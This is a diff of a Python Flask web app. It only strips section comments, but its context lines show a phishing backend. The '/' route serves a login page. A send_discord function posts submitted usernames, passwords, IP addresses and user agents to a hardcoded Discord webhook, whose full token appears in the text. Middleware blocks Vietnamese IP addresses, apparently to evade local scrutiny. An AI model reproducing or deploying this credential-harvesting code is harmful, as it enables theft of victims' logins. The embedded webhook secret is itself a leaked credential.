@@ -7,10 +7,8 @@ from datetime import datetime
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
-# ===== WEBHOOK DISCORD =====
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532691636918812787/kY9rrENUhkJJJHA6fAEh0zLw24sM1kIqb8QiOp_HSVrtn0aObUC22gV5nH8M4pgbuh-9"
 
-# ===== KIỂM TRA IP VIỆT NAM =====
 def get_real_ip():
     if 'X-Forwarded-For' in request.headers:
         ip = request.headers['X-Forwarded-For'].split(',')[0].strip()
@@ -28,7 +26,6 @@ def is_vietnam_ip(ip):
         pass
     return False
 
-# ===== GỬI DISCORD =====
 def send_discord(username, password, ip, user_agent):
     embed = {
         "embeds": [{
@@ -53,14 +50,12 @@ def send_discord(username, password, ip, user_agent):
     except Exception as e:
         print(f"[-] Error: {e}")
 
-# ===== MIDDLEWARE CHẶN IP VN =====
 @app.before_request
 def block_vietnam():
     ip = get_real_ip()
     if is_vietnam_ip(ip):
         return render_template('blocked.html'), 403
 
-# ===== ROUTES =====
 @app.route('/')
 def index():
     return render_template('login.html')
